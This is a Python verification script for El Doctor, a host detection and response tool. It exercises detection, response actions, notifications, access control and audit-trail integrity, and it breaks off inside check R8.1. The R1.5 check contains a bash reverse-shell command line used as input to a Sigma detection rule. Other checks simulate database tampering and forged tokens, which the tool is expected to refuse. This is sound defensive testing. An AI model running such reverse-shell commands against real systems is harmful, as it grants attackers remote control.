#!/usr/bin/env python3
"""Requirement-by-requirement verification of El Doctor (turns 1-8 of the project conversation).

    python3 scripts/verify_requirements.py            # quick: ~1-2 min, behavioural checks in temp dirs
    python3 scripts/verify_requirements.py --full     # + full pytest suite + live 15-scenario attack lab

Every check *exercises* the feature (kills a real process, delivers a real notification over HTTP/SMTP/UDP,
generates deployment bundles, starts the GUI runtime ...) in an isolated temporary ELDOCTOR_HOME, and
prints PASS / FAIL / SKIP with evidence.  Requirement IDs match docs/REQUIREMENTS_TRACEABILITY.md.
Runs with any Python >= 3.9 (tkinter not required - GUI checks use the GUI runtime when available).
"""
from __future__ import annotations

import argparse
import hashlib
import hmac
import json
import os
import shutil
import socket
import socketserver
import subprocess
import sys
import tempfile
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Callable, List, Tuple

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
os.environ.setdefault("ELDOCTOR_PBKDF2_ITER", "20000")          # faster registrations for the checks
PW = "Str0ng!Passw0rd"
RESULTS: List[Tuple[str, str, str, str]] = []                    # (req, check, status, evidence)
CHECKS: List[Callable[[], None]] = []                            # registered in definition order


def check(req: str, name: str):
    def deco(fn: Callable[[], str]):
        def run():
            home = tempfile.mkdtemp(prefix="edverify-")
            os.environ["ELDOCTOR_HOME"] = home
            os.environ["ELDOCTOR_CLIENT_DIR"] = os.path.join(home, ".client")      # session tokens of this check
            t0 = time.time()
            try:
                ev = fn() or ""
                RESULTS.append((req, name, "PASS", f"{ev} ({time.time() - t0:.1f}s)"))
            except SkipCheck as exc:
                RESULTS.append((req, name, "SKIP", str(exc)))
            except Exception as exc:
                RESULTS.append((req, name, "FAIL", f"{type(exc).__name__}: {exc}"))
            finally:
                shutil.rmtree(home, ignore_errors=True)
            print(f"  [{RESULTS[-1][2]}] {req:<5} {name}", flush=True)
        run.req = req
        CHECKS.append(run)
        return run
    return deco


class SkipCheck(Exception):
    pass


def cli(*args, env=None, timeout=180) -> subprocess.CompletedProcess:
    e = dict(os.environ, **(env or {}))
    return subprocess.run([sys.executable, "-m", "eldoctor", *args], cwd=str(ROOT), capture_output=True, text=True,
                          timeout=timeout, env=e)


def spawn(*cmd) -> subprocess.Popen:
    p = subprocess.Popen(list(cmd) or [sys.executable, "-c", "import time; time.sleep(120)"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(0.4)
    return p


def admin():
    from eldoctor.auth.users import UserManager
    from eldoctor.config import load_config
    from eldoctor.storage import Store
    cfg = load_config(overrides={"notifications": {"channels": []},
                                 # only act on processes this verifier started - never on the rest of the machine
                                 "safety": {"only_descendants_of": [os.getpid()]}})
    store = Store()
    um = UserManager(store, cfg)
    user, _ = um.register(f"verifier{um.count() + 1}", PW, "v@example.invalid", use_case="soc",
                          deployment_target="windows")
    return cfg, store, user


# ============================================================================ turn 1
@check("R1.1", "package eldoctor/ with detection, playbooks, response, notify, auth, deploy, ui modules")
def _():
    need = ["collectors", "detection", "playbooks", "response", "notify", "auth", "deploy", "ui"]
    missing = [d for d in need if not (ROOT / "eldoctor" / d / "__init__.py").exists()]
    assert not missing, f"missing {missing}"
    return "all 8 sub-packages present"


@check("R1.2", "original El Doctor features kept: CPU/mem/disk/net metrics, CSV log, curses console, email")
def _():
    from eldoctor.collectors.metrics import CSV_HEADER, MetricsCollector
    m = MetricsCollector(Path(os.environ["ELDOCTOR_HOME"]) / "m.csv")
    d = m.collect()
    m.log_csv(d)
    for k in ("cpu_usage", "used_memory", "total_memory", "used_disk", "incoming_traffic", "outgoing_traffic"):
        assert k in d, k
    assert (Path(os.environ["ELDOCTOR_HOME"]) / "m.csv").read_text().startswith(",".join(CSV_HEADER))
    assert (ROOT / "eldoctor" / "ui" / "tui.py").exists()
    from eldoctor.notify.channels import CHANNEL_TYPES
    assert "email" in CHANNEL_TYPES
    r = subprocess.run([sys.executable, "el_doctor.py", "--version"], cwd=str(ROOT), capture_output=True, text=True)
    assert r.returncode == 0, r.stderr
    return f"cpu={d['cpu_usage']}% mem={d['memory_percent']}% disk={d['disk_percent']}%, CSV + legacy entry point OK"


@check("R1.3", "detection engine: heuristics + threat-intel IOCs, every rule mapped to MITRE ATT&CK")
def _():
    from eldoctor.config import load_config
    from eldoctor.detection.engine import RULES, DetectionEngine
    eng = DetectionEngine(load_config())
    unmapped = [r for r, v in RULES.items() if not v[2] and r != "ED-SYS-003"]
    assert not unmapped, f"unmapped heuristics {unmapped}"
    assert eng.sigma_errors == [] and all(r.mitre for r in eng.sigma_rules)
    assert len(eng.iocs) > 0
    return f"{len(RULES)} heuristic/IOC rules + {len(eng.sigma_rules)} Sigma rules, all ATT&CK-mapped; {len(eng.iocs)} IOCs"


@check("R1.4", "threat-intel feed updater pulls abuse.ch-format feeds and matches a C2 IP")
def _():
    from eldoctor.detection.ioc import IOCStore, update_feeds
    body = b"# Feodo Tracker format\n203.0.113.99\n198.51.100.7\n"

    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a):
            pass
    srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    cfg = {"intel": {"feeds": [{"name": "t_feodo", "url": f"http://127.0.0.1:{srv.server_port}/x", "type": "ip",
                                "severity": "critical"}]}}
    res = update_feeds(cfg)
    srv.shutdown()
    assert res[0]["ok"] and res[0]["count"] == 2, res
    store = IOCStore.from_config(cfg)
    assert store.match_ip("203.0.113.99").source == "t_feodo"
    return "2 indicators downloaded, C2 IP matched"


@check("R1.5", "Sigma (open-source detection format) rules evaluated natively")
def _():
    from eldoctor.config import PLATFORM, load_config
    from eldoctor.detection.engine import DetectionEngine
    from eldoctor.models import ProcessInfo
    eng = DetectionEngine(load_config())
    p = ProcessInfo(pid=999999, name="bash", exe="/usr/bin/bash", create_time=1.0,
                    cmdline=["bash", "-c", "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"])
    hits = [a.title for a in eng.on_process_start(p)]
    assert "Linux Reverse Shell Command Line" in hits or PLATFORM != "linux", hits
    return f"reverse-shell Sigma rule fired ({len(eng.sigma_rules)} rules loaded)"


@check("R1.6", "YAML SOAR playbooks load and validate")
def _():
    from eldoctor.config import package_data
    from eldoctor.playbooks.engine import load_playbooks
    pbs, errs = load_playbooks([package_data("playbooks")])
    assert not errs and len(pbs) >= 9, errs
    return ", ".join(p.id for p in pbs)


def _mode_run(mode: str):
    from eldoctor.collectors.processes import process_info_from_pid
    from eldoctor.models import Alert
    from eldoctor.notify.dispatcher import Dispatcher
    from eldoctor.playbooks.engine import PlaybookEngine
    from eldoctor.playbooks.safety import SafetyGuard
    from eldoctor.response.actions import Responder
    cfg, store, _ = admin()
    eng = PlaybookEngine(cfg, store, Responder(cfg, store, SafetyGuard(cfg)), Dispatcher(cfg, synchronous=True), mode)
    v = spawn()
    run = eng.handle(Alert(rule_id="ED-RES-001", title="hog", severity="high", mitre=["T1496"],
                           process=process_info_from_pid(v.pid).to_dict()))[0]
    time.sleep(0.5)
    alive = v.poll() is None
    v.kill()
    return run, alive, store


@check("R1.7", "three response modes: monitor / interactive approval / enforce")
def _():
    r1, alive1, _ = _mode_run("monitor")
    assert alive1 and any(x["status"] == "would_run" for x in r1["results"]), r1
    r2, alive2, store = _mode_run("interactive")
    assert alive2 and r2["status"] == "awaiting_approval" and store.list_approvals("pending")
    r3, alive3, _ = _mode_run("enforce")
    assert not alive3, r3
    return "monitor: alive + would_run | interactive: approval pending | enforce: killed"


@check("R1.8", "safety guards refuse dangerous actions")
def _():
    from eldoctor.config import load_config
    from eldoctor.playbooks.safety import SafetyGuard
    g = SafetyGuard(load_config())
    assert not g.check_process({"pid": os.getppid(), "name": "x", "exe": "/x"}, "kill")[0]
    assert not g.check_process({"pid": 1, "name": "init", "exe": "/sbin/init"}, "kill")[0]
    assert not g.check_process({"pid": 424242, "name": "lsass.exe", "exe": "C:\\Windows\\lsass.exe"}, "kill")[0]
    assert not g.check_ip("127.0.0.1")[0] and not g.check_ip("169.254.169.254")[0] and not g.check_ip("10.0.0.1")[0]
    assert not g.check_quarantine_path("/usr/bin/python3")[0]
    assert not g.check_quarantine_path("C:\\Users\\u\\AppData\\Local\\Programs\\Python\\Python314\\python.exe")[0]
    return "parent chain, PID 1, lsass, loopback/metadata/private IPs, interpreters all protected"


@check("R1.9", "response actions: kill, suspend, quarantine, block-IP (plus renice, forensics)")
def _():
    import psutil
    from eldoctor.collectors.processes import process_info_from_pid
    from eldoctor.playbooks.safety import SafetyGuard
    from eldoctor.response.actions import Responder
    cfg, store, _ = admin()
    r = Responder(cfg, store, SafetyGuard(cfg))
    v = spawn()
    d = process_info_from_pid(v.pid).to_dict()
    assert r.suspend(d).status == "success" and psutil.Process(v.pid).status() == psutil.STATUS_STOPPED
    assert r.resume(d).status == "success"
    assert r.kill(d).status == "success"
    v.wait(5)
    exe = Path(os.environ["ELDOCTOR_HOME"]) / "dropper"
    shutil.copy(shutil.which("sleep") or "/bin/sleep", exe)
    exe.chmod(0o755)
    q = spawn(str(exe), "60")
    qres = r.quarantine(process_info_from_pid(q.pid).to_dict())
    q.kill()
    assert qres.status == "success" and not exe.exists(), qres.message
    b = r.block_ip("203.0.113.77", reason="verify")
    assert b.status == "success", b.message
    return f"suspend/resume/kill OK, quarantined to vault, block-IP via {b.details.get('backend')}"


@check("R1.10", "notifications: email, Slack, Teams, Discord, Shuffle/n8n/Tines webhooks, TheHive, syslog")
def _():
    from eldoctor.models import Alert
    from eldoctor.notify.dispatcher import Dispatcher
    got, mails, udp_got = [], [], []

    class H(BaseHTTPRequestHandler):
        def do_POST(self):
            body = self.rfile.read(int(self.headers["Content-Length"]))
            got.append((self.path, dict((k.lower(), v) for k, v in self.headers.items()), body))
            self.send_response(200)
            self.end_headers()

        def log_message(self, *a):
            pass

    class S(socketserver.StreamRequestHandler):
        def handle(self):
            w = lambda l: self.wfile.write((l + "\r\n").encode())
            w("220 x")
            while True:
                line = self.rfile.readline().decode().strip()
                if not line:
                    return
                if line.upper().startswith("EHLO"):
                    w("250-x"); w("250 OK")
                elif line.upper() == "DATA":
                    w("354 go")
                    while self.rfile.readline().decode().strip() != ".":
                        pass
                    mails.append(1); w("250 ok")
                elif line.upper() == "QUIT":
                    w("221 bye"); return
                else:
                    w("250 OK")
    http = ThreadingHTTPServer(("127.0.0.1", 0), H)
    smtp = socketserver.ThreadingTCPServer(("127.0.0.1", 0), S)
    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp.bind(("127.0.0.1", 0))
    udp.settimeout(3)
    for s in (http, smtp):
        threading.Thread(target=s.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{http.server_port}"
    os.environ["VERIFY_SECRET"], os.environ["VERIFY_HIVE"] = "s3cret", "hivekey"
    chans = [{"type": "email", "smtp_host": "127.0.0.1", "smtp_port": smtp.server_address[1], "starttls": False,
              "to": ["soc@example.invalid"]},
             {"type": "slack", "url": base + "/slack"}, {"type": "teams", "url": base + "/teams"},
             {"type": "discord", "url": base + "/discord"},
             {"type": "webhook", "name": "shuffle", "url": base + "/shuffle", "secret_env": "VERIFY_SECRET"},
             {"type": "webhook", "name": "n8n", "url": base + "/n8n"}, {"type": "webhook", "name": "tines", "url": base + "/tines"},
             {"type": "thehive", "url": base, "api_key_env": "VERIFY_HIVE"},
             {"type": "syslog", "host": "127.0.0.1", "port": udp.getsockname()[1], "format": "cef"}]
    d = Dispatcher({"notifications": {"min_severity": "low", "channels": chans}}, synchronous=True)
    d.notify(Alert(rule_id="ED-IOC-002", title="verify", severity="critical", mitre=["T1071"],
                   remote_ip="203.0.113.9").to_dict())
    udp_got.append(udp.recv(8192).decode())
    http.shutdown(); smtp.shutdown()
    paths = sorted(p for p, _, _ in got)
    assert paths == ["/api/v1/alert", "/discord", "/n8n", "/shuffle", "/slack", "/teams", "/tines"], paths
    sh = next(g for g in got if g[0] == "/shuffle")
    assert sh[1]["x-eldoctor-signature"] == "sha256=" + hmac.new(b"s3cret", sh[2], hashlib.sha256).hexdigest()
    assert mails and "CEF:0|ElDoctor" in udp_got[0] and not d.errors, d.errors
    return "9 channels delivered (HTTP x7, SMTP, UDP CEF); webhook HMAC signature valid"


@check("R1.11", "registration required before use; roles; use case + deployment target captured")
def _():
    r = cli("alerts")
    assert r.returncode == 2 and "registration" in r.stderr, r.stderr
    r = cli("register", "--non-interactive", "--username", "owner", "--email", "o@example.invalid", "--use-case", "cloud",
            "--deploy-target", "aws", "--password-env", "P", "--json", env={"P": PW})
    assert json.loads(r.stdout)["role"] == "admin", r.stderr
    assert cli("alerts").returncode == 2                                        # registered but not logged in
    r = cli("register", "--non-interactive", "--username", "viewer1", "--email", "v@example.invalid", "--password-env", "P",
            "--json", env={"P": "V1ewer!Passw0rd"})
    assert json.loads(r.stdout)["role"] == "viewer"
    assert cli("login", "--username", "viewer1", "--password-env", "P", env={"P": "V1ewer!Passw0rd"}).returncode == 0
    assert cli("approvals", "approve", "x").returncode == 3                     # viewer may not approve
    assert cli("login", "--username", "owner", "--password-env", "P", env={"P": PW}).returncode == 0
    who = cli("whoami").stdout
    assert "use_case=cloud" in who and "deploy_target=aws" in who, who
    return "unregistered -> blocked (2); first user admin; self-registered viewer denied approve (3)"


@check("R1.12", "deployment generator: Windows desktop, Linux, Docker, Kubernetes, AWS, Azure, GCP")
def _():
    import yaml
    from eldoctor.deploy.generator import TARGETS, generate
    out = Path(os.environ["ELDOCTOR_HOME"]) / "deploy"
    counts = {}
    for t in TARGETS:
        files = generate(t, out / t, {"username": "u", "email": "u@example.invalid"})
        for f in files:
            if f.suffix in (".yaml", ".yml"):
                list(yaml.safe_load_all(f.read_text()))
        counts[t] = len(files)
    assert "Register-ScheduledTask" in (out / "windows" / "install.ps1").read_text()
    assert "eldoctor-gui.exe" in (out / "windows" / "install.ps1").read_text()
    assert "hostPID: true" in (out / "kubernetes" / "30-daemonset.yaml").read_text()
    return ", ".join(f"{k}:{v}" for k, v in counts.items()) + " files"


@check("R1.13", "real-time detection and automated kill of resource hog + malicious process (live agent)")
def _():
    from eldoctor.agent import Agent
    cfg, store, user = admin()
    cfg["agent"]["interval"] = 0.5
    cfg["thresholds"].update(process_cpu=70, process_cpu_duration=2)
    agent = Agent(cfg, store, user, mode="enforce")
    hog = spawn(sys.executable, "-c", "while True: pass")
    miner = Path(os.environ["ELDOCTOR_HOME"]) / "xmrig"
    shutil.copy(shutil.which("sleep") or "/bin/sleep", miner)
    miner.chmod(0o755)
    m = spawn(str(miner), "120")
    t0 = time.time()
    try:
        while time.time() - t0 < 25 and (hog.poll() is None or m.poll() is None):
            agent.tick()
            time.sleep(0.5)
        assert hog.poll() is not None and m.poll() is not None, "not both killed"
        rules = {a["rule_id"] for a in store.list_alerts(100)}
        assert {"ED-RES-001", "ED-IOC-003"} <= rules, rules
    finally:
        agent.dispatcher.close()
        for p in (hog, m):
            if p.poll() is None:
                p.kill()
    return f"CPU hog + miner detected and killed in {time.time() - t0:.1f}s"


@check("R1.14", "log-based detection: real syslog (RFC5424 over UDP) brute force -> alert + block")
def _():
    if not shutil.which("logger"):
        raise SkipCheck("util-linux `logger` not installed")
    from eldoctor.agent import Agent
    cfg, store, user = admin()
    port = 55140 + os.getpid() % 500
    cfg["logs"].update(files=[], journald=False, auditd=False, windows_eventlog=False,
                       syslog_listener={"enabled": True, "host": "127.0.0.1", "port": port, "protocol": "udp"})
    agent = Agent(cfg, store, user, mode="enforce")
    agent.logs.start()
    try:
        for i in range(6):
            subprocess.run(["logger", "-n", "127.0.0.1", "-P", str(port), "-d", "--rfc5424", "-t", "sshd",
                            f"Failed password for invalid user u{i} from 203.0.113.50 port 4{i} ssh2"], check=True)
        time.sleep(1)
        agent.tick()
        rules = {a["rule_id"] for a in store.list_alerts(50)}
        assert "ED-LOG-001" in rules, rules
        assert any(b["ip"] == "203.0.113.50" for b in store.active_blocks())
    finally:
        agent.logs.stop()
        agent.dispatcher.close()
    return "6 failed SSH logins via syslog -> ED-LOG-001 (T1110.001) -> 203.0.113.50 blocked"


# ============================================================================ turn 2
@check("R2.1", "turn 2: `python3 eldoctor` and other launch styles work (no '<frozen runpy>' error)")
def _():
    styles = [["eldoctor"], ["-m", "eldoctor"], ["el_doctor.py"], ["eldoctor/__main__.py"]]
    for s in styles:
        r = subprocess.run([sys.executable, *s, "--version"], cwd=str(ROOT), capture_output=True, text=True)
        assert r.returncode == 0 and "Traceback" not in r.stderr, (s, r.stderr[-300:])
    r = subprocess.run([sys.executable, str(ROOT / "eldoctor"), "--version"], cwd="/", capture_output=True, text=True)
    assert r.returncode == 0, r.stderr
    return "python eldoctor | -m eldoctor | el_doctor.py | eldoctor/__main__.py | from another folder"


@check("R2.2", "turn 2: missing dependency -> install instruction instead of a traceback")
def _():
    code = ("import sys; sys.path.insert(0, %r); from eldoctor import _bootstrap as b; "
            "b.REQUIRED['no_such_mod_xyz'] = 'no-such-pkg'; b.ensure_dependencies()" % str(ROOT))
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True)
    assert r.returncode == 1 and "pip install" in r.stderr and "Traceback" not in r.stderr, r.stderr
    assert (ROOT / "requirements.txt").exists()
    return "clear `pip install -r requirements.txt` message, exit code 1"


# ============================================================================ turns 3-5
def _tk_python():
    from eldoctor.ui import runtime
    if runtime.probe(sys.executable):
        return sys.executable
    ready = runtime.ready_runtime()
    if ready:
        return str(ready[0])
    found = runtime.find_tk_python(lambda m: None)
    return found[0] if found else None


def _ensure_pytest(py: str) -> None:
    """GUI tests need pytest inside the Tk-capable interpreter (El Doctor's GUI runtime has no test tools)."""
    if subprocess.run([py, "-c", "import pytest"], capture_output=True).returncode == 0:
        return
    print(f"        (installing pytest into {py} for the GUI tests)", flush=True)
    r = subprocess.run([py, "-m", "pip", "install", "-q", "pytest"], capture_output=True, text=True, timeout=600)
    if r.returncode != 0:
        raise SkipCheck(f"pytest not installed in {py} and could not be installed: {r.stderr.strip()[-200:]}")


@check("R3.1", "turn 3: desktop GUI - all tabs, registration/login, approvals, manual response (GUI tests)")
def _():
    py = _tk_python()
    if not py:
        raise SkipCheck("no Python with Tk on this machine")
    if sys.platform.startswith("linux") and not os.environ.get("DISPLAY"):
        raise SkipCheck("no DISPLAY - run on a desktop or with DISPLAY=:1")
    _ensure_pytest(py)
    r = subprocess.run([py, "-m", "pytest", "-q", "-p", "no:warnings", "tests/test_gui.py"], cwd=str(ROOT),
                       capture_output=True, text=True, timeout=600,
                       env=dict(os.environ, PYTHONPATH=str(ROOT)))
    assert r.returncode == 0, r.stdout[-800:]
    return r.stdout.strip().splitlines()[-1] + f" (python {py})"


@check("R4.1", "turn 4: GUI starts from a Python WITHOUT tkinter and without sudo (auto GUI runtime)")
def _():
    from eldoctor.ui import runtime
    if not _tk_python():
        raise SkipCheck("no Tk-capable Python here (see `uv python install 3.12`)")
    env = {k: v for k, v in os.environ.items() if k != "ELDOCTOR_GUI_RUNTIME"}
    code = ("import sys; sys.path.insert(0, %r); from eldoctor.ui import runtime; "
            "sys.exit(runtime.relaunch_gui(['--version'], log=lambda m: None) or 0)" % str(ROOT))
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, timeout=900, env=env)
    assert r.returncode == 0 and "El Doctor" in r.stdout, r.stderr[-500:]
    here = "has no tkinter" if not runtime.probe(sys.executable) else "has tkinter (runtime path still exercised)"
    return f"this Python {here}; relaunched in GUI runtime -> {r.stdout.strip()}"


@check("R5.1", "turn 5: light mode + dark mode + follow-system, switchable, WCAG AA contrast")
def _():
    py = _tk_python()
    if not py:
        raise SkipCheck("no Python with Tk on this machine")
    code = ("import sys; sys.path.insert(0, %r); from eldoctor.ui import gui; "
            "assert set(gui.THEMES) == {'light', 'dark'} and gui.THEME_CHOICES == ['system', 'light', 'dark']; "
            "t = gui.THEMES; bad = [(n, k, round(gui.contrast(c, t[n][b]), 2)) for n in t for b in ('panel', 'card', 'bg') "
            "for k, c in list(t[n]['sev'].items()) + list(t[n]['status'].items()) + [(x, t[n][x]) for x in ('fg', 'muted')] "
            "if gui.contrast(c, t[n][b]) < 4.5]; assert not bad, bad; print('min ok')" % str(ROOT))
    r = subprocess.run([py, "-c", code], capture_output=True, text=True, timeout=60)
    assert r.returncode == 0, r.stderr[-400:]
    h = cli("gui", "--help").stdout
    assert "--theme" in h and "light" in h
    return "light + dark palettes >= 4.5:1 on all backgrounds; --theme / Ctrl+T / Settings > Appearance"


# ============================================================================ turn 7: agent-side trust boundary (P0-1)
def _svc(**cfg_over):
    from eldoctor.api.server import AgentService
    from eldoctor.config import load_config
    cfg = load_config(overrides=dict({"notifications": {"channels": []},
                                      "safety": {"only_descendants_of": [os.getpid()]}}, **cfg_over))
    return AgentService(cfg), cfg


def _client(svc, peer=None):
    from eldoctor.api.client import ApiClient
    from eldoctor.api.peercred import own_identity
    from eldoctor.api.transport import InProcessTransport
    c = ApiClient(InProcessTransport(svc.handle, peer or own_identity(), f"verify-{id(svc)}"))
    c.token = None
    return c


@check("R7.1", "local authenticated API on a Unix socket / named pipe with OS-level peer credentials")
def _():
    from eldoctor.api.client import ApiClient
    from eldoctor.api.transport import UnixTransport
    if sys.platform.startswith("win"):
        raise SkipCheck("named-pipe transport: Windows only (not executable here)")
    svc, _ = _svc()
    try:
        _client(svc).call("auth.register", username="owner", password=PW, email="o@example.invalid")
        srv = svc.start_listener()
        t = UnixTransport(srv.endpoint).connect()                          # client verifies the server (SO_PEERCRED)
        assert t.server.uid == str(os.getuid()) and t.server.pid == os.getpid()
        c = ApiClient(t)
        c.token = None
        c.login("owner", PW)
        peer = c.call("auth.whoami")["peer"]
        assert peer["transport"] == "unix" and peer["uid"] == str(os.getuid()) and peer["pid"] == os.getpid()
        mode = oct(os.stat(srv.endpoint).st_mode & 0o777)
        rec = svc.store.list_audit(1)[0]
        assert rec["os_uid"] == str(os.getuid()) and rec["client"] == "cli"
        c.close()
        return (f"socket {srv.endpoint} ({mode}); kernel peer creds uid={peer['uid']} pid={peer['pid']} seen by the "
                f"agent and written into the audit trail")
    finally:
        svc.close()


@check("R7.2", "stateless session tokens (JWT HS256) bound to the OS account; revocation without a session table")
def _():
    import base64
    from eldoctor.api.client import ApiError
    from eldoctor.api.peercred import Peer
    svc, _ = _svc()
    try:
        c = _client(svc)
        c.call("auth.register", username="owner", password=PW, email="o@example.invalid")
        c.login("owner", PW)
        claims = json.loads(base64.urlsafe_b64decode(c.token.split(".")[1] + "=="))
        assert claims["ouid"] == str(os.getuid()) and "jti" in claims and "exp" in claims
        assert not svc.store.query("SELECT 1 FROM sqlite_master WHERE name='sessions'")
        thief = _client(svc, Peer(pid=1, uid="4242", user="attacker_user"))
        thief.token = c.token
        try:
            thief.call("alerts.list")
            raise AssertionError("token accepted from another OS account")
        except ApiError as exc:
            assert exc.code == "unauthenticated"
        h, p, sig = c.token.split(".")
        forged = json.loads(base64.urlsafe_b64decode(p + "=="))
        forged["role"] = "admin"
        bad = _client(svc)
        bad.token = h + "." + base64.urlsafe_b64encode(json.dumps(forged).encode()).rstrip(b"=").decode() + "." + sig
        assert bad.whoami() is None
        c.logout()
        assert c.whoami() is None
        return "HS256 JWT (sub/uid/tv/ouid/jti/exp), replay from uid 4242 refused, edited claims refused, logout = jti denylist"
    finally:
        svc.close()


@check("R7.3", "CLI / TUI / GUI are clients: RBAC for approvals and admin is decided by the agent")
def _():
    from eldoctor.api.client import ApiError
    from eldoctor.api.server import METHODS
    from eldoctor.auth.users import PERMISSIONS
    for f in ("eldoctor/ui/gui.py", "eldoctor/ui/tui.py", "eldoctor/cli.py"):
        src = (ROOT / f).read_text()
        for needle in ("from eldoctor.storage import", "Store(", "decide_approval(", "UserManager("):
            assert needle not in src, f"{f} still touches the database directly ({needle})"
    svc, _ = _svc()
    try:
        admin = _client(svc)
        admin.call("auth.register", username="owner", password=PW, email="o@example.invalid")
        _client(svc).call("auth.register", username="viewer_user", password="V1ewer!Passw0rd", email="v@example.invalid")
        viewer_user = _client(svc)
        viewer_user.login("viewer_user", "V1ewer!Passw0rd")
        refused = 0
        for name, spec in METHODS.items():
            if spec.perm and spec.perm not in PERMISSIONS["viewer"]:
                try:
                    viewer_user.call(name)
                except ApiError as exc:
                    assert exc.code == "forbidden", name
                    refused += 1
        denied = len(svc.store.query("SELECT 1 FROM audit WHERE event='api_denied'"))
        return (f"front ends contain no DB access; viewer refused by the agent on {refused} protected methods "
                f"(approve, respond, admin...), {denied} api_denied audit records")
    finally:
        svc.close()


@check("R7.4", "data folder locked to the service account (eldoctor service)")
def _():
    import stat
    if sys.platform.startswith("win"):
        raise SkipCheck("Windows ACL lockdown (icacls, SYSTEM only) is not executable here")
    home = Path(os.environ["ELDOCTOR_HOME"])
    os.chmod(home, 0o755)
    (home / "stray.txt").write_text("x")
    os.chmod(home / "stray.txt", 0o666)
    r = cli("service", "--bootstrap", "--duration", "2", "--mode", "monitor",
            env={"ELDOCTOR_ADMIN_USER": "owner", "ELDOCTOR_ADMIN_EMAIL": "o@example.invalid"})
    assert r.returncode == 0, r.stderr[-500:]
    assert "lockdown fixed" in r.stdout
    modes = {p.relative_to(home).as_posix(): oct(stat.S_IMODE(os.lstat(p).st_mode)) for p in [home, *home.rglob("*")]
             if not p.is_symlink() and not stat.S_ISSOCK(os.lstat(p).st_mode) and ".client" not in p.parts}
    loose = {k: v for k, v in modes.items() if int(v, 8) & 0o077}
    assert not loose, loose
    return f"{len(modes)} paths owned by uid {os.getuid()} with no group/other access (folder 0o700, files 0o600)"


@check("R7.5", "tamper-evident audit trail: hash-chained records + agent MAC + sealed head pointer")
def _():
    import sqlite3
    from eldoctor.storage import Store
    svc, _ = _svc()
    try:
        for i in range(5):
            svc.store.audit("admin_user", f"event_{i}", {"i": i})
        assert svc.verify_audit()["ok"]
        path = svc.store.path
    finally:
        svc.close()
    found = []
    attacks = {"edit actor": "UPDATE audit SET actor='admin1' WHERE id=3",
               "delete a record": "DELETE FROM audit WHERE id=4",
               "truncate the tail": "DELETE FROM audit WHERE id=(SELECT MAX(id) FROM audit)"}
    for i, (label, attack) in enumerate(attacks.items()):
        copy = path.parent / f"attack{i}" / path.name                # each attack on a fresh copy (same key)
        copy.parent.mkdir()
        shutil.copy(path, copy)
        shutil.copytree(path.parent / "keys", copy.parent / "keys")
        db = sqlite3.connect(str(copy), isolation_level=None)
        db.execute(attack)
        db.close()
        res = Store(copy).verify_audit()
        assert not res["ok"], attack
        found.append(f"{label} -> {res['problems'][0]['problem'].split(' (')[0]}")
    return "; ".join(found)


@check("R7.6", "audit trail forwarded to the SIEM in real time (syslog TCP/UDP/TLS, CEF / RFC 5424 / JSON, webhook)")
def _():
    from eldoctor.siem import verify_export
    srv = socket.socket()
    srv.bind(("127.0.0.1", 0))
    srv.listen(1)
    srv.settimeout(5)
    port = srv.getsockname()[1]
    svc, _ = _svc(audit={"forward": [{"type": "syslog", "host": "127.0.0.1", "port": port, "protocol": "tcp",
                                      "format": "json"}]})
    try:
        svc.forwarder.start()
        t0 = time.time()
        _client(svc).call("auth.register", username="owner", password=PW, email="o@example.invalid")
        conn, _ = srv.accept()
        conn.settimeout(5)
        buf = b""
        head = svc.store.audit_head()["seq"]
        while buf.count(b"\n") < head:
            buf += conn.recv(65536)
        latency = time.time() - t0
        recs = [json.loads(x) for x in buf.decode().splitlines()]
        assert verify_export(recs)["ok"] and [r["seq"] for r in recs] == list(range(1, head + 1))
        conn.close()
        return f"{len(recs)} records delivered in order in {latency:.2f}s; SIEM copy re-verifies (hash chain)"
    finally:
        svc.close()
        srv.close()


@check("R7.7", "P0-1 regression: approval forged in the database is refused, raised as a critical incident")
def _():
    import sqlite3
    from eldoctor.agent import Agent
    from eldoctor.collectors.processes import process_info_from_pid
    from eldoctor.models import Alert
    cfg, store, user = admin()
    um_v = __import__("eldoctor.auth.users", fromlist=["UserManager"]).UserManager(store, cfg)
    um_v.register("attacker_user", "M4llory!Passw0rd", "m@example.invalid")
    agent = Agent(cfg, store, user, mode="interactive")
    v = spawn()
    try:
        run = agent.playbooks.handle(Alert(rule_id="ED-RES-001", title="hog", severity="high", mitre=["T1496"],
                                           process=process_info_from_pid(v.pid).to_dict()))[0]
        aid = run["approval_id"]
        db = sqlite3.connect(str(store.path), isolation_level=None)
        db.execute("UPDATE approvals SET status='approved', decided_by=?, decided_ts=? WHERE id=?",
                   (user.username, time.time(), aid))
        db.execute("UPDATE users SET role='admin' WHERE username='attacker_user'")
        db.close()
        agent.playbooks.process_approvals()
        time.sleep(0.5)
        assert v.poll() is None, "forged approval executed"
        assert store.get_approval(aid)["status"] == "rejected"
        assert store.query("SELECT 1 FROM alerts WHERE rule_id='ED-INT-001'")
        assert um_v.get("attacker_user") is None                         # edited role -> account not trusted
        return "forged approval not executed (process alive, status 'rejected', ED-INT-001); forged admin role refused"
    finally:
        agent.dispatcher.close()
        v.kill()


# ============================================================================ turn 8: close the remaining limits
def _raw(store):
    import sqlite3
    c = sqlite3.connect(str(store.path), isolation_level=None)
    c.row_factory = sqlite3.Row
    return c


@check("R8.1", "forward-secure signatures: stealing every key file cannot rewrite history; SIEM verifies w/o secret")
def _():
    from eldoctor.integrity import SigningChain, audit_hash
    from eldoctor.siem import as_json, verify_export
    from eldoctor.storage import Store
    store = Store()
    for i in range(6):
        store.audit("admin_user", f"event_{i}", {"i": i})
    rows = store.query("SELECT *, id AS seq FROM audit ORDER BY id")
    on_disk = {p.stem for p in store.signer.dir.glob("*.key")}
    assert on_disk == {rows[-1]["next_pub"]}, "used signing keys must be destroyed"
    genesis = store.verify_audit()["genesis"]
